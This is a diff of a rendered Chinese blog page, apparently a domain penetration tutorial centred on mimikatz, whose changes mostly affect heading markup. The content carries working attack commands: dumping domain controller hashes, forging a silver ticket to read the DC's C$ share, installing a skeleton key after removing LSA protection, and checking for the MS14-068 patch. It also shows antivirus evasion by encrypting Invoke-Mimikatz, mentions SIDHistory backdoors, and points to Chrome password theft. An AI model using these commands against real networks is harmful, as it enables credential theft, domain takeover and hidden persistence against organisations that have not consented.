+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何 Kerberos 服务权限，且由 krbtgt 的 hash 加密，金票在使用的过程需要和域控通信</p>
 <p>白银票据：伪造 TGS ，只能访问指定的服务，且由服务账号（通常为计算机账户）的 Hash 加密 ，银票在使用的过程不需要同域控通信</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Copy#在域控上导出 DC$ 的 HASH
 </span></span><span style="display:flex;"><span>mimikatz log <span style="color:#a6be9d">&#34;privilege::debug&#34;</span> <span style="color:#a6be9d">&#34;sekurlsa::logonpasswords&#34;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####利用 DC$ 的 Hash制作一张 cifs 服务的白银票据</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#利用 DC$ 的 Hash制作一张 cifs 服务的白银票据</span>
 </span></span><span style="display:flex;"><span>kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969 /target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs /user:strage /ptt
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####cifs是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统</span>
-</span></span><span style="display:flex;"><span>dir <span style="color:#a6be9d">\\</span>DC.ABC.COM<span style="color:#a6be9d">\C</span>$</span></span></code></pre></div><p>####### skeleton key</p>
-<p>skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。</p>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#cifs是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统</span>
+</span></span><span style="display:flex;"><span>dir <span style="color:#a6be9d">\\</span>DC.ABC.COM<span style="color:#a6be9d">\C</span>$</span></span></code></pre></div><h3 id="skeleton-key" class="heading-element"><span>skeleton key</span>
+  <a href="#skeleton-key" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">Copy</span><span style="color:#828b96;font-style:italic">#在域控上安装 skeleton key
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">mimikatz</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">exe</span> <span style="color:#58a1dd">privilege</span><span style="color:#ff636f">::</span><span style="color:#58a1dd">debug</span> <span style="color:#a6be9d">&#34;misc::skeleton&#34;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatz
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatz
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">net</span> <span style="color:#ff636f">use</span> <span style="color:#58a1dd">\\WIN</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">9</span><span style="color:#58a1dd">P499QKTLDO</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">adtest</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">com\c</span>$ <span style="color:#58a1dd">mimikatz</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">user</span><span style="color:#ff636f">:</span><span style="color:#58a1dd">adtest\administrator</span></span></span></code></pre></div><p>微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。</p>
 <p><img loading="lazy" src="http://www.0-sec.org/%E5%9F%9F%E6%B8%97%E9%80%8F/img/70.png" alt="img" srcset="http://www.0-sec.org/%E5%9F%9F%E6%B8%97%E9%80%8F/img/70.png?size=small, http://www.0-sec.org/%E5%9F%9F%E6%B8%97%E9%80%8F/img/70.png?size=medium 1.5x, http://www.0-sec.org/%E5%9F%9F%E6%B8%97%E9%80%8F/img/70.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#a6be9d">Copy#适用系统</span>
@@ -391,28 +459,40 @@
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Copyprivilege::debug
 </span></span><span style="display:flex;"><span>!+
 </span></span><span style="display:flex;"><span>!processprotect /process:lsass.exe /remove 
-</span></span><span style="display:flex;"><span>misc::skeleton</span></span></code></pre></div><p>####### MS14-068</p>
-<p>当我们拿到了一个普通域成员的账号后，想继续对该域进行渗透，拿到域控服务器权限。如果域控服务器存在 MS14_068 漏洞，并且未打补丁，那么我们就可以利用 MS14_068 快速获得域控服务器权限。</p>
+</span></span><span style="display:flex;"><span>misc::skeleton</span></span></code></pre></div><h3 id="ms14-068" class="heading-element"><span>MS14-068</span>
+  <a href="#ms14-068" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>当我们拿到了一个普通域成员的账号后，想继续对该域进行渗透，拿到域控服务器权限。如果域控服务器存在 MS14_068 漏洞，并且未打补丁，那么我们就可以利用 MS14_068 快速获得域控服务器权限。</p>
 <p>MS14-068编号 CVE-2014-6324，补丁为 3011780 ，如果自检可在域控制器上使用命令检测。</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Copysysteminfo |find <span style="color:#a6be9d">&#34;3011780&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####为空说明该服务器存在MS14-068漏洞</span></span></span></code></pre></div><p>操作链接：MS14-068复现(CVE-2014-6324)：https://www.cnblogs.com/-mo-/p/11890539.html</p>
-<h6 id="其他" class="heading-element"><span>0.0.0.3.6  其他</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#为空说明该服务器存在MS14-068漏洞</span></span></span></code></pre></div><p>操作链接：MS14-068复现(CVE-2014-6324)：https://www.cnblogs.com/-mo-/p/11890539.html</p>
+<h2 id="其他" class="heading-element"><span>其他</span>
   <a href="#%e5%85%b6%e4%bb%96" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>####### 导出chrome中的密码</p>
-<p>详情请见：https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&amp;mid=2247483949&amp;idx=1&amp;sn=db4853c88e4bf0a550c095d9017a363c&amp;chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1582350092849&amp;sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd</p>
-<p>####### 隐藏功能</p>
-<p>管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：</p>
+</h2><h3 id="导出chrome中的密码" class="heading-element"><span>导出chrome中的密码</span>
+  <a href="#%e5%af%bc%e5%87%bachrome%e4%b8%ad%e7%9a%84%e5%af%86%e7%a0%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>详情请见：https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&amp;mid=2247483949&amp;idx=1&amp;sn=db4853c88e4bf0a550c095d9017a363c&amp;chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1582350092849&amp;sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd</p>
+<h3 id="隐藏功能" class="heading-element"><span>隐藏功能</span>
+  <a href="#%e9%9a%90%e8%97%8f%e5%8a%9f%e8%83%bd" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#58a1dd">Copyprivilege</span><span style="color:#ff636f">::</span><span style="color:#58a1dd">debug</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">misc</span><span style="color:#ff636f">::</span><span style="color:#58a1dd">cmd</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">misc</span><span style="color:#ff636f">::</span><span style="color:#58a1dd">regedit</span>
-</span></span><span style="display:flex;"><span><span style="color:#58a1dd">misc</span><span style="color:#ff636f">::</span><span style="color:#58a1dd">taskmgr</span></span></span></code></pre></div><p>####### 免杀</p>
-<p>Powersploit中提供的很多工具都是做过加密处理的，同时也提供了一些用来加密处理的脚本，Out-EncryptedScript就是其中之一。</p>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">misc</span><span style="color:#ff636f">::</span><span style="color:#58a1dd">taskmgr</span></span></span></code></pre></div><h3 id="免杀" class="heading-element"><span>免杀</span>
+  <a href="#%e5%85%8d%e6%9d%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Powersploit中提供的很多工具都是做过加密处理的，同时也提供了一些用来加密处理的脚本，Out-EncryptedScript就是其中之一。</p>
 <p>首先在本地对Invoke-Mimikatz.ps1进行加密处理：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">Copypoweshell</span>.<span style="color:#58a1dd">exe</span> <span style="color:#58a1dd">Import-Module</span> .\<span style="color:#58a1dd">Out-EncryptedScript</span>.<span style="color:#58a1dd">ps1</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">poweshell</span>.<span style="color:#58a1dd">exe</span> <span style="color:#58a1dd">Out-EncryptedScript</span> <span style="color:#58a1dd">-ScriptPath</span> .\<span style="color:#58a1dd">Invoke-Mimikatz</span>.<span style="color:#58a1dd">ps1</span> <span style="color:#58a1dd">-Password</span> <span style="color:#58a1dd">密码</span> <span style="color:#58a1dd">-Salt</span> <span style="color:#58a1dd">随机数</span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####默认生成的文件是evil.ps1</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#默认生成的文件是evil.ps1</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">-Password</span>   <span style="color:#58a1dd">设置加密的密钥</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">-Salt</span>       <span style="color:#58a1dd">随机数</span>，<span style="color:#58a1dd">防止被暴力破解</span></span></span></code></pre></div><p>将加密生成的evil.sp1脚本放在目标机上，执行如下命令：</p>
@@ -425,15 +505,15 @@
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$decrypted</span> = <span style="color:#58a1dd">de</span> <span style="color:#58a1dd">password</span> <span style="color:#58a1dd">salt</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">Invoke-Expression</span> <span style="color:#58a1dd">$decrypted</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">Invoke-Mimikatz</span></span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192352079.webp" alt="image-20231019235230924" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192352079.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192352079.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192352079.webp?size=large 2x" data-title="image-20231019235230924" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h5 id="四模块" class="heading-element"><span>0.0.0.4  四、模块</span>
+<h1 id="四模块" class="heading-element"><span>四、模块</span>
   <a href="#%e5%9b%9b%e6%a8%a1%e5%9d%97" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="sid" class="heading-element"><span>0.0.0.4.1  SID</span>
+</h1><h2 id="sid" class="heading-element"><span>SID</span>
   <a href="#sid" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>在渗透测试中的利用，一个是使用SIDHistory属性来留后门，另一个是修改域对象的SID来实现域内的“影子账户”或者跨域等操作</p>
+</h2><p>在渗透测试中的利用，一个是使用SIDHistory属性来留后门，另一个是修改域对象的SID来实现域内的“影子账户”或者跨域等操作</p>
 <p><strong>1. SIDHistoy后门</strong></p>
 <p>拿下域控后，我们将普通域用户test1的sIDHistory属性设置为域管的SID：</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406091043802.webp" alt="image-20240609104342696" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406091043802.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406091043802.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406091043802.webp?size=large 2x" data-title="image-20240609104342696" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
